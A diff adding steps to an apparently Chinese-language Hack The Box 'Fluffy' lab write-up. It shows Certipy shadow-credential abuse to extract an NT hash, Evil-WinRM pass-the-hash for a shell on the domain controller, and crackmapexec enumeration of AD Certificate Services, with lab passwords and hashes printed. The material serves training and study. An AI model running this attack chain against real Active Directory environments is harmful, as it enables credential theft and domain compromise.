@@ -284,4 +284,66 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Restoring the old Key Credentials for 'ca_svc'
 [*] Successfully restored the old Key Credentials for 'ca_svc'
 [*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
+
+#certipy shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account winrm_svc
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Targeting user 'winrm_svc'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '6c55cc41-bcc2-6c67-fc17-df34eddabbd7'
+[*] Adding Key Credential with device ID '6c55cc41-bcc2-6c67-fc17-df34eddabbd7' to the Key Credentials for 'winrm_svc'
+[*] Successfully added Key Credential with device ID '6c55cc41-bcc2-6c67-fc17-df34eddabbd7' to the Key Credentials for 'winrm_svc'
+[*] Authenticating as 'winrm_svc' with the certificate
+[*] Using principal: winrm_svc@fluffy.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'winrm_svc.ccache'
+[*] Trying to retrieve NT hash for 'winrm_svc'
+[*] Restoring the old Key Credentials for 'winrm_svc'
+[*] Successfully restored the old Key Credentials for 'winrm_svc'
+[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
 ```
+#### 使用winrm_svc用户的RC4散列，应该可以通过winrm访问目标。因此，我们使用Evil-winrm获得交互式外壳。
+```
+#evil-winrm -u 'winrm_svc' -H 33bd09dcd697600edf6b3a7af4875767 -i dc01.fluffy.htb
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\winrm_svc\Documents> whoami
+fluffy\winrm_svc
+*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> cat user.txt
+*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> exit
+                                        
+Info: Exiting with code 0
+```
+### Privilege Escalation
+#### 应该在Active Directory环境中进行进一步的枚举。应该发现目标器中正在运行Active Directory证书服务。让我们使用crackmapexec来确认这一点使用adc模块。
+#### 注:使用crackmapexec不要在root权限执行
+```
+[★]$ crackmapexec ldap 10.129.232.88 -u 'winrm_svc' -H 33bd09dcd697600edf6b3a7af4875767 -M adcs
+<SNIP>
+LDAP        10.129.232.88   389    10.129.232.88    [-] Error retrieving os arch of 10.129.232.88: Could not connect: timed out
+SMB         10.129.232.88   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
+LDAP        10.129.232.88   389    DC01             [+] fluffy.htb\winrm_svc:33bd09dcd697600edf6b3a7af4875767
+ADCS        10.129.232.88   389    DC01             [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
+ADCS        10.129.232.88   389    DC01             Found PKI Enrollment Server: DC01.fluffy.htb
+ADCS        10.129.232.88   389    DC01             Found CN: fluffy-DC01-CA
+```
+#### '(objectClass=pKIEnrollmentService)'这是一个 LDAP 搜索条件,在整个 AD 里，找所有 证书颁发机构（CA）对象
+```
+只要能在 LDAP 里搜到这个 objectClass，就说明
+| 能说明什么           | 是否成立 |
+| --------------- | ---- |
+| 域内启用了 AD CS     | ✅    |
+| 存在至少一个 CA       | ✅    |
+| CA 对象可被 LDAP 枚举 | ✅    |
+| 有可能存在 ESC 漏洞    | ✅    |
+```
+#### 由于我们知道ADCS安装在域控制器上，我们可以使用证书来查找易受攻击的漏洞模板。为此，我们必须使用检索到的ca_svc用户的RC4散列早些时候。
